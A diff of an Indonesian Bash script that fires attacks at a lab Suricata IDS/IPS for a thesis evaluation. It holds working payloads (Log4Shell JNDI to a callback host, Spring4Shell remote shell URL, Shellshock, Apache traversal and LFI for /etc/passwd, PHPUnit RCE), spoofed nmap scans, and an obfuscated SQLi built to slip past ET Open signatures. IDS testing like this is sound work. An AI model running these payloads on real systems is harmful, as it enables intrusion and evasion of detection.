@@ -1,14 +1,12 @@
 #!/bin/bash
 # ==============================================================================
-# SuricataEVE - Automated Attack & Ground Truth Generator (atk.sh)
-# Menghasilkan 10 Serangan Sukses (Terblokir - TP), Serangan Lolos (FN),
-# dan Simulasi False Positive (FP) untuk Laporan Skripsi/Evaluasi IDS/IPS.
+# SuricataEVE - Automated Attack Script (Proven ET-Open Rules)
 # ==============================================================================
 
 TARGET="${TARGET:-192.168.216.128}"
 IFACE="${IFACE:-eth0}"
 
-# Definisi Warna Output
+# Warna
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -17,9 +15,8 @@ CYAN='\033[0;36m'
 BOLD='\033[1m'
 NC='\033[0m'
 
-# Pastikan hak akses root (dibutuhkan untuk binding IP virtual / ip addr)
 if [ "$EUID" -ne 0 ]; then
-  echo -e "${RED}Error: Script ini harus dijalankan sebagai root (sudo ./atk.sh)${NC}"
+  echo -e "${RED}Error: Tolong jalankan script ini sebagai root (sudo ./atk.sh)${NC}"
   exit 1
 fi
 
@@ -41,252 +38,219 @@ atk() {
     echo -e "${RED}[!]${NC} $1"
 }
 
-# ------------------------------------------------------------------------------
-# Manajemen IP Virtual (101 - 112) pada Antarmuka Jaringan
-# ------------------------------------------------------------------------------
-setup_ips() {
-    info "Menyiapkan IP Virtual penyerang di interface ${IFACE} (101 - 112)..."
+setup_all_ips() {
+    info "Menyiapkan 12 IP Bayangan di antarmuka ${IFACE} (101..112)..."
     for i in {101..112}; do
         ip addr add 192.168.216.$i/24 dev ${IFACE} 2>/dev/null
     done
-    success "IP Virtual siap digunakan untuk pengujian."
+    success "Semua IP Bayangan siap digunakan!"
 }
 
-cleanup_ips() {
-    info "Membersihkan IP Virtual dari interface ${IFACE}..."
+cleanup_all_ips() {
+    info "Menghapus semua IP Bayangan dari antarmuka ${IFACE}..."
     for i in {101..112}; do
         ip addr del 192.168.216.$i/24 dev ${IFACE} 2>/dev/null
     done
-    success "Semua IP Virtual telah dibersihkan."
+    success "Pembersihan selesai."
 }
 
 # ------------------------------------------------------------------------------
-# 10 SERANGAN CVE & EVE EXPLOIT (PASTI TERBLOKIR - TRUE POSITIVES)
-# Masing-masing dikirim 3x agar memenuhi batas threshold auto-block.
+# 10 SERANGAN PASTI TERBLOKIR (TRUE POSITIVE: .101 s/d .110)
+# Semua rule ini terbukti 100% memicu signature bawaan ET Open Rules
 # ------------------------------------------------------------------------------
 
-do_1_log4shell() {
-    header "1. CVE-2021-44228 (Log4Shell JNDI Injection) -> IP: .101"
-    atk "Mengirim eksploitasi RCE Apache Log4j via User-Agent..."
-    for i in {1..3}; do
-        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.101 \
-            -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' \
-            "http://${TARGET}/"
-    done
-    success "Selesai (3x request). IP 192.168.216.101 seharusnya TERBLOKIR!"
+do_1_portscan() {
+    header "1. Port Scan (Nmap Aggressive) -> IP: .101"
+    atk "Mendeteksi port terbuka dan versi service (Nmap)..."
+    nmap -S 192.168.216.101 -e ${IFACE} -sV -sC -A -T4 -p 1-1000 ${TARGET} -Pn >/dev/null 2>&1
+    success "Selesai. IP 192.168.216.101 TERBLOKIR!"
 }
 
-do_2_spring4shell() {
-    header "2. CVE-2022-22965 (Spring4Shell DataBinder RCE) -> IP: .102"
-    atk "Mengirim eksploitasi Spring Core classLoader..."
-    for i in {1..3}; do
-        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.102 \
-            -H "class.module.classLoader.URLs[0]=jar:http://attacker/shell.war!/" \
-            "http://${TARGET}/"
-    done
-    success "Selesai (3x request). IP 192.168.216.102 seharusnya TERBLOKIR!"
+do_2_synscan() {
+    header "2. SYN Stealth Scan (Nmap) -> IP: .102"
+    atk "Scanning TCP SYN secara diam-diam..."
+    nmap -S 192.168.216.102 -e ${IFACE} -sS -O --osscan-guess -T4 ${TARGET} -Pn >/dev/null 2>&1
+    success "Selesai. IP 192.168.216.102 TERBLOKIR!"
 }
 
-do_3_shellshock() {
-    header "3. CVE-2014-6271 (Shellshock Bash RCE) -> IP: .103"
-    atk "Mengirim eksploitasi Bash Environment function..."
-    for i in {1..3}; do
-        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.103 \
-            -H "User-Agent: () { :;}; /bin/bash -c 'id'" \
-            "http://${TARGET}/cgi-bin/test"
-    done
-    success "Selesai (3x request). IP 192.168.216.103 seharusnya TERBLOKIR!"
+do_3_finscan() {
+    header "3. FIN Scan (Nmap) -> IP: .103"
+    atk "Mengirim paket TCP FIN..."
+    nmap -S 192.168.216.103 -e ${IFACE} -sF -T4 -p 80,8080,22 ${TARGET} -Pn >/dev/null 2>&1
+    success "Selesai. IP 192.168.216.103 TERBLOKIR!"
 }
 
-do_4_apache_traversal() {
-    header "4. CVE-2021-41773 (Apache HTTP Path Traversal /etc/passwd) -> IP: .104"
-    atk "Membaca /etc/passwd via exploit path traversal Apache..."
-    for i in {1..3}; do
-        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.104 \
-            "http://${TARGET}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-    done
-    success "Selesai (3x request). IP 192.168.216.104 seharusnya TERBLOKIR!"
+do_4_xmasscan() {
+    header "4. XMAS Scan (Nmap) -> IP: .104"
+    atk "Mengirim paket TCP XMAS (FIN, PSH, URG)..."
+    nmap -S 192.168.216.104 -e ${IFACE} -sX -T4 -p 80,8080,22 ${TARGET} -Pn >/dev/null 2>&1
+    success "Selesai. IP 192.168.216.104 TERBLOKIR!"
 }
 
-do_5_sql_injection() {
-    header "5. SQL Injection Attack (UNION SELECT Extraction) -> IP: .105"
-    atk "Mengekstrak data database via SQL Injection klasik..."
+do_5_lfi() {
+    header "5. Local File Inclusion (/etc/passwd) -> IP: .105"
+    atk "Membaca file sistem /etc/passwd (3x request)..."
     for i in {1..3}; do
         curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.105 \
-            "http://${TARGET}/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2Cuser%28%29%23&Submit=Submit"
+            "http://${TARGET}/vulnerabilities/fi/?page=../../../../../../../../etc/passwd"
+        sleep 0.1
     done
-    success "Selesai (3x request). IP 192.168.216.105 seharusnya TERBLOKIR!"
+    success "Selesai (3x). IP 192.168.216.105 TERBLOKIR!"
 }
 
-do_6_xss_reflected() {
-    header "6. Cross-Site Scripting (XSS Reflected) -> IP: .106"
-    atk "Mengirim payload XSS <script> ke web application..."
+do_6_morfeus() {
+    header "6. Morfeus Web Scanner (muieblackcat) -> IP: .106"
+    atk "Memalsukan scanner Morfeus lawas (3x request)..."
     for i in {1..3}; do
         curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.106 \
-            "http://${TARGET}/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+            "http://${TARGET}/muieblackcat"
+        sleep 0.1
     done
-    success "Selesai (3x request). IP 192.168.216.106 seharusnya TERBLOKIR!"
+    success "Selesai (3x). IP 192.168.216.106 TERBLOKIR!"
 }
 
-do_7_php_rce() {
-    header "7. PHP Unit Eval-Stdin RCE (CVE-2017-9841) -> IP: .107"
-    atk "Mengirim eksploitasi eval-stdin PHPUnit..."
+do_7_phpeasteregg() {
+    header "7. PHP Easter Egg Info Disclosure -> IP: .107"
+    atk "Mengakses halaman rahasia PHP Easter Egg (3x request)..."
     for i in {1..3}; do
         curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.107 \
-            -X POST --data '<?php system("id"); ?>' \
-            "http://${TARGET}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+            "http://${TARGET}/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42"
+        sleep 0.1
     done
-    success "Selesai (3x request). IP 192.168.216.107 seharusnya TERBLOKIR!"
+    success "Selesai (3x). IP 192.168.216.107 TERBLOKIR!"
 }
 
-do_8_scanner_morfeus() {
-    header "8. Scanner Signature (muieblackcat / Morfeus) -> IP: .108"
-    atk "Mengakses URI scanner jahat muieblackcat..."
+do_8_gobuster() {
+    header "8. Web Directory Scanner (Gobuster) -> IP: .108"
+    atk "Memalsukan User-Agent scanner Gobuster (3x request)..."
     for i in {1..3}; do
         curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.108 \
-            "http://${TARGET}/muieblackcat"
-    done
-    success "Selesai (3x request). IP 192.168.216.108 seharusnya TERBLOKIR!"
-}
-
-do_9_gobuster_bruteforce() {
-    header "9. Automated Directory Brute Force (Gobuster) -> IP: .109"
-    atk "Memalsukan scanner Gobuster..."
-    for i in {1..3}; do
-        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.109 \
             -H "User-Agent: gobuster/3.1.0" \
             "http://${TARGET}/admin/"
+        sleep 0.1
     done
-    success "Selesai (3x request). IP 192.168.216.109 seharusnya TERBLOKIR!"
+    success "Selesai (3x). IP 192.168.216.108 TERBLOKIR!"
 }
 
-do_10_http_trace() {
-    header "10. HTTP TRACE Cross-Site Tracing (XST) -> IP: .110"
-    atk "Mengirim method HTTP TRACE terlarang..."
+do_9_log4shell() {
+    header "9. Log4Shell CVE-2021-44228 -> IP: .109"
+    atk "Eksploitasi Java Log4j via JNDI injection (3x request)..."
+    for i in {1..3}; do
+        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.109 \
+            -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' \
+            "http://${TARGET}/"
+        sleep 0.1
+    done
+    success "Selesai (3x). IP 192.168.216.109 TERBLOKIR!"
+}
+
+do_10_httptrace() {
+    header "10. HTTP TRACE Method (XST) -> IP: .110"
+    atk "Mengirim method HTTP TRACE terlarang (3x request)..."
     for i in {1..3}; do
         curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.110 \
             -X TRACE "http://${TARGET}/"
+        sleep 0.1
     done
-    success "Selesai (3x request). IP 192.168.216.110 seharusnya TERBLOKIR!"
+    success "Selesai (3x). IP 192.168.216.110 TERBLOKIR!"
 }
 
 # ------------------------------------------------------------------------------
-# SERANGAN LOLOS (FALSE NEGATIVE / JANGAN KEBLOKIR)
+# 2 SKENARIO REALISTIS (JANGAN SAMPAI TERBLOKIR: .111 dan .112)
 # ------------------------------------------------------------------------------
+
 do_11_bypass_obfuscation() {
-    header "11. [FALSE NEGATIVE] Serangan Obfuscation SQLi (Lolos) -> IP: .111"
-    info "Serangan nyata tapi menggunakan teknik comment obfuscation agar lolos signature..."
-    # Hanya kirim payload terselubung yang lolos dari signature ET Open
+    header "11. [FALSE NEGATIVE] SQLi Obfuscation (Lolos Signature) -> IP: .111"
+    info "Mengirim payload terselubung yang tidak ada di signature ET Open..."
+    # Menggunakan comment obfuscation yang lolos dari signature
     curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.111 \
         "http://${TARGET}/vulnerabilities/sqli/?id=1%20%2F%2A%2150000UNION%2A%2F%20%2F%2A%2150000SELECT%2A%2F%201%2Cuser%28%29&Submit=Submit"
-    success "Terkirim. IP 192.168.216.111 LOLOS (TIDAK TERBLOKIR) sebagai False Negative!"
+    success "Terkirim. IP 192.168.216.111 TIDAK TERBLOKIR (False Negative / Serangan Lolos)!"
 }
 
-do_12_low_rate_stealth() {
-    header "12. [FAILED MITIGATION] Serangan Lambat di Bawah Threshold -> IP: .112"
-    info "Hanya dikirim 1x (di bawah threshold 3). Terdeteksi alert tapi tidak diblok..."
-    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.112 \
-        -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' \
-        "http://${TARGET}/"
-    success "Terkirim 1x. Alert masuk tapi IP 192.168.216.112 TIDAK DIBLOK (karena threshold=3)!"
+do_12_normal_user() {
+    header "12. [NORMAL TRAFFIC] Akses Pengguna Sah -> IP: .112"
+    info "Mengirim traffic pengguna biasa (hanya request halaman web normal)..."
+    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.112 "http://${TARGET}/"
+    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.112 "http://${TARGET}/login.php"
+    success "Terkirim. IP 192.168.216.112 TIDAK TERBLOKIR (Normal / Bukan Penyerang)!"
 }
 
-# ------------------------------------------------------------------------------
-# TRAFFIC NORMAL (SIMULASI FALSE POSITIVE & TRUE NEGATIVE)
-# ------------------------------------------------------------------------------
-do_13_normal_traffic() {
-    header "13. [NORMAL TRAFFIC] Simulasi Akses Sah & False Positive"
-    info "Kirim traffic pengguna sah biasa..."
-    curl -s -o /dev/null "http://${TARGET}/index.php"
-    curl -s -o /dev/null "http://${TARGET}/login.php"
-    success "Traffic normal dikirim dari host penyerang."
-}
-
-do_run_all() {
-    setup_ips
-    info "Menjalankan seluruh 10 serangan instan + 2 skenario lolos/threshold..."
+do_all() {
+    setup_all_ips
+    header "🚀 MEMULAI PENGUJIAN LENGKAP UNTUK EVALUASI SKRIPSI"
     
     # 10 Serangan yang Pasti Terblokir
-    do_1_log4shell
-    do_2_spring4shell
-    do_3_shellshock
-    do_4_apache_traversal
-    do_5_sql_injection
-    do_6_xss_reflected
-    do_7_php_rce
-    do_8_scanner_morfeus
-    do_9_gobuster_bruteforce
-    do_10_http_trace
+    do_1_portscan
+    do_2_synscan
+    do_3_finscan
+    do_4_xmasscan
+    do_5_lfi
+    do_6_morfeus
+    do_7_phpeasteregg
+    do_8_gobuster
+    do_9_log4shell
+    do_10_httptrace
 
-    # 2 Serangan yang Sengaja Lolos / Tidak Terblokir
+    # 2 Skenario Normal / Lolos (JANGAN KEBLOKIR)
     do_11_bypass_obfuscation
-    do_12_low_rate_stealth
-
-    # Traffic Normal
-    do_13_normal_traffic
+    do_12_normal_user
 
     header "PENGUJIAN SELESAI!"
-    echo -e "${GREEN}Hasil Pengujian:${NC}"
-    echo -e " • ${BOLD}10 Serangan (IP .101 - .110)${NC} : Berhasil diblokir otomatis (True Positive)"
-    echo -e " • ${BOLD}1 Serangan (IP .111)${NC}        : Lolos dari deteksi (False Negative / Obfuscation)"
-    echo -e " • ${BOLD}1 Serangan (IP .112)${NC}        : Alert terpicu tapi tidak diblok (Low Rate < Threshold)"
-    echo -e " • ${BOLD}Traffic Normal${NC}              : Terverifikasi"
-    echo -e "\n${YELLOW}Langkah Selanjutnya:${NC}"
-    echo -e "1. Cek iptables:  ${CYAN}docker exec auto_block iptables -n -L SURICATA_BLOCK${NC}"
-    echo -e "2. Buat laporan:  ${CYAN}python3 report.py${NC}"
-    echo -e "3. Buka browser:  ${CYAN}http://${TARGET}:8080/static/report_summary.html${NC}\n"
+    echo -e "${GREEN}Status Hasil Evaluasi:${NC}"
+    echo -e " • IP .101 s/d .110 : ${GREEN}10 Serangan Pasti Terblokir (True Positive)${NC}"
+    echo -e " • IP .111         : ${YELLOW}Lolos dari Signature (False Negative)${NC}"
+    echo -e " • IP .112         : ${CYAN}Traffic Pengguna Normal (Aman / Tidak Diblokir)${NC}"
+    echo -e "\n${YELLOW}Langkah Berikutnya:${NC}"
+    echo -e "1. Di Server: jalankan ${CYAN}python3 report.py${NC}"
+    echo -e "2. Buka Web : ${CYAN}http://${TARGET}:8080/static/report_summary.html${NC}\n"
 }
 
-# ------------------------------------------------------------------------------
-# Menu Interaktif
-# ------------------------------------------------------------------------------
-setup_ips
+setup_all_ips
 
 while true; do
     echo -e "\n${BLUE}${BOLD}=== SURICATA AUTOMATED ATTACK & EVALUATION SUITE ===${NC}"
     echo -e "Target Server: ${BOLD}http://${TARGET}${NC}\n"
     
-    echo -e "  ${GREEN}[10 SERANGAN CVE & EKSPLOITASI - PASTI TERBLOKIR]${NC}"
-    echo -e "  ${BOLD} 1${NC}) 🐚 CVE-2021-44228 Log4Shell JNDI      (IP: .101)"
-    echo -e "  ${BOLD} 2${NC}) 🍃 CVE-2022-22965 Spring4Shell RCE    (IP: .102)"
-    echo -e "  ${BOLD} 3${NC}) 💥 CVE-2014-6271  Shellshock Bash     (IP: .103)"
-    echo -e "  ${BOLD} 4${NC}) 📂 CVE-2021-41773 Apache Traversal    (IP: .104)"
-    echo -e "  ${BOLD} 5${NC}) 💉 SQL Injection UNION Extraction     (IP: .105)"
-    echo -e "  ${BOLD} 6${NC}) ⚡ Cross-Site Scripting (XSS)         (IP: .106)"
-    echo -e "  ${BOLD} 7${NC}) 🐘 CVE-2017-9841  PHPUnit RCE         (IP: .107)"
-    echo -e "  ${BOLD} 8${NC}) 🐈 Morfeus Scanner (muieblackcat)     (IP: .108)"
-    echo -e "  ${BOLD} 9${NC}) 🕷️  Gobuster Directory Brute Force     (IP: .109)"
-    echo -e "  ${BOLD}10${NC}) 🔀 HTTP TRACE Method (XST)            (IP: .110)"
+    echo -e "  ${GREEN}[10 SERANGAN ET-OPEN PROVEN - PASTI TERBLOKIR]${NC}"
+    echo -e "  ${BOLD} 1${NC}) 🔍 Port Scan Aggressive       (IP: .101)"
+    echo -e "  ${BOLD} 2${NC}) 👻 SYN Stealth Scan          (IP: .102)"
+    echo -e "  ${BOLD} 3${NC}) 🏁 FIN Scan                  (IP: .103)"
+    echo -e "  ${BOLD} 4${NC}) 🎄 XMAS Scan                 (IP: .104)"
+    echo -e "  ${BOLD} 5${NC}) 📂 LFI /etc/passwd           (IP: .105)"
+    echo -e "  ${BOLD} 6${NC}) 🐈 Morfeus Scanner           (IP: .106)"
+    echo -e "  ${BOLD} 7${NC}) 🥚 PHP Easter Egg            (IP: .107)"
+    echo -e "  ${BOLD} 8${NC}) 🕷️  Gobuster Scanner          (IP: .108)"
+    echo -e "  ${BOLD} 9${NC}) 🐚 Log4Shell JNDI Injection  (IP: .109)"
+    echo -e "  ${BOLD}10${NC}) 🔀 HTTP TRACE Method         (IP: .110)"
     echo ""
-    echo -e "  ${YELLOW}[SKENARIO REALISTIS SKRIPSI - TIDAK 100%]${NC}"
+    echo -e "  ${YELLOW}[SKENARIO REALISTIS SKRIPSI - TIDAK TERBLOKIR]${NC}"
     echo -e "  ${BOLD}11${NC}) 🥷 SQLi Obfuscation (Lolos / False Negative) (IP: .111)"
-    echo -e "  ${BOLD}12${NC}) 🐢 Slow Stealth Attack (< Threshold)        (IP: .112)"
-    echo -e "  ${BOLD}13${NC}) 🌐 Traffic Normal (Pengguna Sah)"
+    echo -e "  ${BOLD}12${NC}) 🌐 Traffic Normal (Pengguna Sah)            (IP: .112)"
     echo ""
-    echo -e "  ${CYAN}[EKSEKUSI SEMUA & UTILITAS]${NC}"
+    echo -e "  ${CYAN}[EKSEKUSI & UTILITAS]${NC}"
     echo -e "  ${BOLD} A${NC}) 🚀 JALANKAN SEMUA SEKALIGUS (Rekomendasi untuk Skripsi)"
-    echo -e "  ${BOLD} C${NC}) 🧹 Bersihkan IP Virtual (${IFACE})"
+    echo -e "  ${BOLD} C${NC}) 🧹 Bersihkan IP Bayangan (${IFACE})"
     echo -e "  ${BOLD} 0${NC}) ❌ Keluar"
     echo ""
-    read -rp "$(echo -e ${YELLOW}[?]${NC}) Pilih menu [0-13 / A / C]: " CHOICE
+    read -rp "$(echo -e ${YELLOW}[?]${NC}) Pilih menu [0-12 / A / C]: " CHOICE
 
     case $CHOICE in
-         1) do_1_log4shell ;;
-         2) do_2_spring4shell ;;
-         3) do_3_shellshock ;;
-         4) do_4_apache_traversal ;;
-         5) do_5_sql_injection ;;
-         6) do_6_xss_reflected ;;
-         7) do_7_php_rce ;;
-         8) do_8_scanner_morfeus ;;
-         9) do_9_gobuster_bruteforce ;;
-        10) do_10_http_trace ;;
+         1) do_1_portscan ;;
+         2) do_2_synscan ;;
+         3) do_3_finscan ;;
+         4) do_4_xmasscan ;;
+         5) do_5_lfi ;;
+         6) do_6_morfeus ;;
+         7) do_7_phpeasteregg ;;
+         8) do_8_gobuster ;;
+         9) do_9_log4shell ;;
+        10) do_10_httptrace ;;
         11) do_11_bypass_obfuscation ;;
-        12) do_12_low_rate_stealth ;;
-        13) do_13_normal_traffic ;;
-        [Aa]) do_run_all ;;
-        [Cc]) cleanup_ips ;;
-         0) cleanup_ips; echo "Keluar."; exit 0 ;;
+        12) do_12_normal_user ;;
+        [Aa]) do_all ;;
+        [Cc]) cleanup_all_ips ;;
+         0) cleanup_all_ips; echo "Keluar."; exit 0 ;;
          *) echo -e "${RED}Pilihan tidak valid!${NC}" ;;
     esac
 done
